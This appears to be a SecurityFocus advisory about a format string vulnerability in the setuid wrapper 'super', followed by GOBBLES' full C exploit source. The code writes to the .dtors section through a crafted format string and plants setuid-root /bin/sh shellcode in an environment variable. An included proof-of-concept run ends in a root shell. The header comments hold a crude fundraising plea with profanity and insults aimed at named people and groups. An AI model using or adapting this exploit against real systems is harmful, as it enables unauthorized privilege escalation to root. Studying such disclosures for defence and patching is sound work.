source: http://www.securityfocus.com/bid/5367/info

super is prone to a format string vulnerability. This problem is due to incorrect use of the syslog() function to log error messages. It is possible to corrupt memory by passing format strings through the vulnerable logging function. This may potentially be exploited to overwrite arbitrary locations in memory with attacker-specified values. 

/*
 * SAVE DEFCON..HELP GOBBLES..SAVE DEFCON..HELP GOBBLES
 *
 * When GOBBLES say he and he security team
 * are non-profit. He really mean NON-profit.
 * This means GOBBLES and he GOBBLES Security
 * Labs (GSL) friends do not have much funds.
 *
 * GOBBLES was hoping to receive the money 
 * for speaking at the defcon gathering of
 * security enthusiasts up front. So he could buy 
 * and pay for he ticket to Las Vegas from the great city
 * of Baltimore where he currently resides.
 *
 * GOBBLES is not selling out.  GOBBLES is just admitting that he
 * need your help.  Please, help GOBBLES!
 *
 * After many e-mails to defcon organisers it became
 * apparent to GOBBLES this was not going to happen.
 * This mean GOBBLES has no way of getting to defcon.
 * This also mean GOBBLES cannot deliver he talk that
 * are named "Wolves among us". Alot of time and work
 * went into the preperation of this talk and it was
 * to be the grand finale of the year of the turkey
 * (2002). With many new 0-day to give out and many
 * great anouncements to be made.
 *
 * Thanks to Jeff Moss (dt@defcon.org, jmoss@blackhat.com) 
 * you, the defcon attendee, may very well get cheated out 
 * of attending one of the most provocative and daring
 * events defcon history has ever seen. 
 *
 * 	!!! ITS NOT TOO LATE..BUT HURRY !!!
 * 
 * Help GOBBLES go to defcon. GOBBLES give so much to
 * the community..is it not time the community now help
 * a poverty stricken turkey to spread his wings and fly
 * towards fame and glory? 
 *
 * Reasons why you should help GOBBLES get to defcon:
 *  
 * -- Paying for GOBBLES plane ticket to Vegas is better than spending $300 on a stripper
 *
 * -- Seeing GOBBLES present naked: Priceless.
 * 
 * -- Zeroday (possible hardcover) GOBBLES comic
 *
 * -- A chance to buy GOBBLES art
 *
 * -- A chance to receive _free_ GOBBLES T-shirts
 * 
 * -- Copies of those exploits you couldn't code
 *
 *
 * What does GOBBLES need?
 *
 * Basically GOBBLES need to round up 300 US dollars before saturday.
 * "Wolves among us" is sheduled for the last day of defcon.
 * Namely 3PM on Sunday August 4th. As you can very well imagine
 * this talk was going to blow the lid off of more dirty secrets
 * than there are noodles in China. With your help GOBBLES can still 
 * make this happen. So what GOBBLES is asking for is a little helping
 * hand from the community. If anyone has the funds to sponsor GOBBLES
 * to come to defcon please contact GOBBBLES at GOBBLES@hushmail.com.
 *
 *     !!! TURKEY SUPPORTERS...DO NOT LET THE TURKEY BE SILENCED !!!
 *
 * GOBBLES accepts Western Union payments.  GOBBLES will not accept anything
 * beyond the amount needed for travel to Vegas and back.  GOBBLES is not 
 * selling out, GOBBLES is asking help from those penetrators and researchers
 * that GOBBLES helps every day.
 *
 * In other news, ISS rejected GOBBLES request for a job application.  It 
 * seems that they're afraid of getting scalp'd.
 *
 * 			     Political statement:
 * HALT THE SNOSOFT ABUSE OF 14 YEAR OLDS. MAKING CHILDREN SLAVE OVER 3 LINE
 * PERL EXPLOITS FOR LESS THAN MINIMUM WAGE IS NOT VERY ETHICAL !!!
 *
 * FREE DVDMAN FREE DVDMAN FREE DVDMAN FREE DVDMAN FREE DVDMAN FREE DVDMAN  
 * JAIL W00W00 JAIL W00W00 JAIL W000W0 JAIL W00W00 JAIL W00W00 JAIL W00W00
 * FUCK ADM FUCK ADM FUCK ADM FUCK ADM FUCK ADM FUCK ADM FUCK ADM FUCK ADM
 */

/*
 * GOBBLES-own-super.c 
 *  -- root exploit for root hole in root wrapper
 * 
 * Super is sudo wannabe that boasts much security.
 * GOBBLES think people who write setuid wrappers
 * should learn to program securely before opening
 * big hoohoo about how secure program is.
 *
 * Current super version (3.18):
   -- ftp://ftp.ucolick.org/pub/users/will/
 * 
 * Super maintainer say following about he code:
 *
 * "Super allows an admin to control access to files
 *  and functions for users. It is similar to sudo, but 
 *  uses a different approach in the configuration file."
 *
 * Problem:
 * 
 * When super is compiled to use syslog(3) for its logging
 * of error messages the following lines makes pre-auth
 * local root exploitation rather trivial:
 * 
 * From error.c 
 * ... 
 * #define SysLog(pri, buf) syslog((pri), (buf))
 * ...
 * SysLog(error_priority, buf);
 * ...
 *
 * This means users that are not in the super config file
 * will be able to execute code with root priviledges.
 *
 * "Super acts as a SetUID wrapper around system commands
 *  to make sure the commands are executed safely, and
 *  only by authorized users."
 *
 * 		hehehe ;PPpPPPPp
 *
 * Love, 
 * GOBBLES
 * GOBBLES@hushmail.com
 * 
 * Official site: http://www.bugtraq.org
 * Official mirror: http://www.immunitysec.com/GOBBLES/
 */

/* Proof Of Concept:

$ gcc GOBBLES-own-super.c -o GOBBLES-own-super   
$ ./GOBBLES-own-super 

Usage: 
./GOBBLES-own-super -t <.dtors address> [ -o <offset> -A <allignment> ]

$ objdump -s -j .dtors /usr/local/bin/super

/usr/local/bin/super:     file format elf32-i386

Contents of section .dtors:
 8063f7c ffffffff 00000000                    ........        

$ ./GOBBLES-own-super -t 0x8063f7c
. target @ 0x8063f80
. shellcode @ 0xbfffffb0
. username: 9 bytes
super: No such super command as `xx��%.49103x%29$hn%.16305x%30$hn'.
sh-2.05# 

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/types.h>

#define ALLIGN		2 
#define DPA		29 	

#define SUPER		"/usr/local/bin/super"

void buildstring(unsigned long t, unsigned long w, int dpa, int allign);
void stuff(void);

extern char **environ;
char string[256];

int
main(int argc, char **argv)
{
	unsigned long t, w;
	int dpa, allign, shift = 0;
	char c, *store;	

	if(argc == 1) {
		fprintf(stderr, "\nUsage: \n%s -t <.dtors address> [ -o <offset> -A <allignment> ]\n", argv[0]);
		exit(0);
	}
	
	allign = ALLIGN;
	dpa = DPA;
	
	while((c = getopt(argc, argv, "t:o:A:")) != EOF) {
		switch(c) {
			case 't':
				sscanf(optarg, "%p", &store);
				t = (long)store;
			 	t += 4;
				break;
			case 'o':
				dpa = atoi(optarg);
				break;
			case 'A':
				allign = atoi(optarg);
				break;
			default:
				fprintf(stderr, "hehehe ;PPppPPPp\n");
				exit(0);
		}
	}
	
	store = NULL;

	if((store = getenv("GOBBLES")) == NULL) {
		stuff();
		if(execve(argv[0], argv, environ)) {
			fprintf(stderr, ". problem re-executing\n");
			exit(1);
		}
	}
	
	w = (long)store;
	// shift is signed so this works both ways
	shift = (strlen(argv[0]) - strlen(SUPER));
	w += shift;
	
	fprintf(stderr, ". target @ %p\n. shellcode @ %p\n", t, w);
			
	buildstring(t, w, dpa, allign);
	
	if(execl(SUPER, "super", string, NULL)) {
		fprintf(stderr, "error executing\n");
		exit(1);
	}
}

void 
buildstring(unsigned long t, unsigned long w, int dpa, int allign)
{
	unsigned int un, deux, x, b[4], namelen;
	char a_buf[4];
	struct passwd *pass;	

	memset(string, '\0', sizeof(string));
	memset(a_buf, '\0', sizeof(a_buf));
	
	if((pass = getpwuid(getuid())) == NULL) {
		fprintf(stderr, ". can't find your username\n");
		exit(1);
	}
 
	namelen = strlen(pass->pw_name);

	fprintf(stderr, ". username: %d bytes\n", namelen);

	for(x = 0; x < allign && x < sizeof(a_buf); x++)
		a_buf[x] = 'x';

	b[0] = (t & 0x000000ff);
	b[1] = (t & 0x0000ff00) >> 8;
	b[2] = (t & 0x00ff0000) >> 16;
	b[3] = (t & 0xff000000) >> 24; 

	un = (w >> 16) & 0xffff;
	deux = w & 0xffff; 

	if(un < deux) {
                snprintf(string, sizeof(string)-1, 
			"%s" 
			"%c%c%c%c%c%c%c%c"  
			"%%.%hdx" "%%%d$hn" 
			"%%.%hdx" "%%%d$hn",
                        a_buf, 
			b[0] + 2, b[1], b[2], b[3], b[0], b[1], b[2], b[3],
                        un - (8 + allign + 29 + namelen), 
			dpa, deux - un, dpa + 1 
			
		);
        }
        else {
                snprintf(string, sizeof(string)-1, 
			"%s" 
			"%c%c%c%c%c%c%c%c" 
			"%%.%hdx" "%%%d$hn" 
			"%%.%hdx" "%%%d$hn",
                        a_buf, 
			b[0], b[1], b[2], b[3], b[0] + 2, b[1], b[2], b[3],
                        deux - (8 + allign + 29 + namelen), 
			dpa, un-deux, dpa + 1
			
		);
        }
}

void  
stuff(void)
{
        char code[] = // the setuid 0 with the execve of the /bin/sh
	"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31"
	"\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d"
	"\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff"
	"\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58";
	setenv("GOBBLES", code, 1);
}